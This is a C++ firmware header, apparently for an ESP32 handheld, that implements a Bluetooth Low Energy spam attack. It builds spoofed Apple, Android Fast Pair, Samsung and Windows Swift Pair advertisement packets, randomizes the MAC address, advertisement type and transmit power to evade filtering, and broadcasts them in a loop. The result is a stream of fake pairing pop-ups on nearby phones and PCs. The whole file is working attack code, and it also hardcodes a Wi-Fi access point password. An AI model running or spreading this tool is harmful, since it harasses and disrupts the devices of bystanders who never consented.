#pragma once

#include "utils.hpp"

#include "apple_devices.hpp"
#include "android_devices.hpp"
#include "samsung_devices.hpp"

String spamming_device = "None";

String SPAM_PAYLOAD_TYPE_NAMES[] = {
    "None",
    "Apple Device",
    "Apple Short",
    "Android",
    "Samsung",
    "Windows",
    "All",
    "[Exit]"
};

enum SPAM_PAYLOAD_TYPE {
    SPAM_PAYLOAD_TYPE_NONE,
    SPAM_PAYLOAD_TYPE_APPLE_DEVICE,
    SPAM_PAYLOAD_TYPE_APPLE_SHORT,
    SPAM_PAYLOAD_TYPE_ANDROID,
    SPAM_PAYLOAD_TYPE_SAMSUNG,
    SPAM_PAYLOAD_TYPE_WINDOWS,
    SPAM_PAYLOAD_TYPE_ALL,
};

void BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE type)
{
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++){
        dummy_addr[i] = random(256);
        if (i == 0){
        dummy_addr[i] |= 0xF0;
        }
    }

    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    int adv_type = random(3);

    if (type == SPAM_PAYLOAD_TYPE_APPLE_DEVICE)
    {
        int index = random(22);
        oAdvertisementData.addData(std::string((char*)APPLE_DEVICES[index], 31));
        spamming_device = "Apple Device";
    }
    else if (type == SPAM_PAYLOAD_TYPE_APPLE_SHORT)
    {
        int index = random(13);
        oAdvertisementData.addData(std::string((char*)APPLE_SHORT_DEVICES[index], 23));
        spamming_device = "Apple Short";
    }
    else if (type == SPAM_PAYLOAD_TYPE_ANDROID)
    {
        uint32_t model_id = ANDROID_MODEL_IDS[random(ANDROID_MODEL_IDS_COUNT)];

        uint8_t data[31];
        int i = 0;
        data[i++] = 3;
        data[i++] = 0x03;
        data[i++] = 0x2C;
        data[i++] = 0xFE;

        data[i++] = 6;
        data[i++] = 0x16;
        data[i++] = 0x2C;
        data[i++] = 0xFE;
        data[i++] = (uint8_t)((model_id >> 16) & 0xFF);
        data[i++] = (uint8_t)((model_id >> 8) & 0xFF);
        data[i++] = (uint8_t)(model_id & 0xFF);

        data[i++] = 2;
        data[i++] = 0x0A;
        data[i++] = (uint8_t)((rand() % 120) - 100);

        oAdvertisementData.addData(std::string((char*)data, 14));
        spamming_device = "Android";
    }
    else if (type == SPAM_PAYLOAD_TYPE_SAMSUNG)
    {
        uint8_t data[15];
        int i = 0;

        uint8_t model = SAMSUNG_DEVICES[random(25)];

        data[i++] = 14;
        data[i++] = 0xFF;
        data[i++] = 0x75;
        data[i++] = 0x00;
        data[i++] = 0x01;
        data[i++] = 0x00;
        data[i++] = 0x02;
        data[i++] = 0x00;
        data[i++] = 0x01;
        data[i++] = 0x01;
        data[i++] = 0xFF;
        data[i++] = 0x00;
        data[i++] = 0x00;
        data[i++] = 0x43;
        data[i++] = (model >> 0x00) & 0xFF;

        oAdvertisementData.addData(std::string((char *)data, 15));
        spamming_device = "Samsung";
    }
    else if (type == SPAM_PAYLOAD_TYPE_WINDOWS)
    {
        const char* Name = "✨✨✨✨";
        uint8_t name_len = strlen(Name);
        uint8_t data[7 + name_len];
        int i = 0;

        data[i++] = 7 + name_len - 1;
        data[i++] = 0xFF;
        data[i++] = 0x06;
        data[i++] = 0x00;
        data[i++] = 0x03;
        data[i++] = 0x00;
        data[i++] = 0x80;
        memcpy(&data[i], Name, name_len);
        i += name_len;

        oAdvertisementData.addData(std::string((char *)data, 7 + name_len));
        spamming_device = "Windows";
    }
    else if (type == SPAM_PAYLOAD_TYPE_ALL)
    {
        spamming_device = "All";
    }

    if (adv_type == 0)
    {
        advertising->setAdvertisementType(ADV_TYPE_IND);
    }
    else if (adv_type == 1)
    {
        advertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    }
    else
    {
        advertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    advertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    advertising->setAdvertisementData(oAdvertisementData);

    advertising->setMinInterval(0x20);
    advertising->setMaxInterval(0x20);
    advertising->setMinPreferred(0x20);
    advertising->setMaxPreferred(0x20);

    advertising->start();
    delay(100);
    advertising->stop();

    int rand_val = random(100);
  if (rand_val < 70) {
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  } else if (rand_val < 85) {
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
  } else if (rand_val < 95) {
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
  } else if (rand_val < 99) {
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
  } else {
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
  }
}

void BLE_Spam()
{
    wifi_mode_t prev_mode = WIFI_MODE_NULL;
    esp_err_t err = esp_wifi_get_mode(&prev_mode);

    bool had_ap = (WiFi.getMode() == WIFI_AP || WiFi.getMode() == WIFI_AP_STA);

    if (err == ESP_OK) {
        esp_wifi_stop();
        WiFi.mode(WIFI_MODE_NULL);
        delay(200);
    }

    delay(200);

    BLE_Setup();

    String selected = SelectionMenu(SPAM_PAYLOAD_TYPE_NAMES, sizeof(SPAM_PAYLOAD_TYPE_NAMES) / sizeof(String));
    SPAM_PAYLOAD_TYPE type = SPAM_PAYLOAD_TYPE_NONE;
    selected.toLowerCase();
    if (selected == "none") type = SPAM_PAYLOAD_TYPE_NONE;
    else if (selected == "apple device") type = SPAM_PAYLOAD_TYPE_APPLE_DEVICE;
    else if (selected == "apple short") type = SPAM_PAYLOAD_TYPE_APPLE_SHORT;
    else if (selected == "android") type = SPAM_PAYLOAD_TYPE_ANDROID;
    else if (selected == "samsung") type = SPAM_PAYLOAD_TYPE_SAMSUNG;
    else if (selected == "windows") type = SPAM_PAYLOAD_TYPE_WINDOWS;
    else if (selected == "all") type = SPAM_PAYLOAD_TYPE_ALL;

    int num = 0;

    while (!ReadButton(BUTTON_CENTER))
    {
        display.clearDisplay();
        Display_PrintCentered("Spamming:\n%s\nn. %d", spamming_device.c_str(), num);
        display.display();

        if (type == SPAM_PAYLOAD_TYPE_ALL) {
            BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_APPLE_DEVICE);
            BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_APPLE_SHORT);
            BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_ANDROID);
            BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_SAMSUNG);
            BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_WINDOWS);
            spamming_device = "All";
            num += 5;
        } else {
            BLE_SpamSendPayload(type);
            ++num;
        }
    }
    advertising->stop();
    
    BLEDevice::deinit(true);
    delay(200);

    if (err == ESP_OK) {
        if (had_ap) {
            WiFi.mode(WIFI_AP_STA);
            WiFi.softAP("Pocket Puter", "deveclipse");
        } else {
            WiFi.mode(prev_mode);
            if (prev_mode != WIFI_MODE_NULL) {
                esp_wifi_start();
            }
        }
        delay(200);
    }

    HaltTillRelease(BUTTON_CENTER);
    display.clearDisplay();
    display.display();
}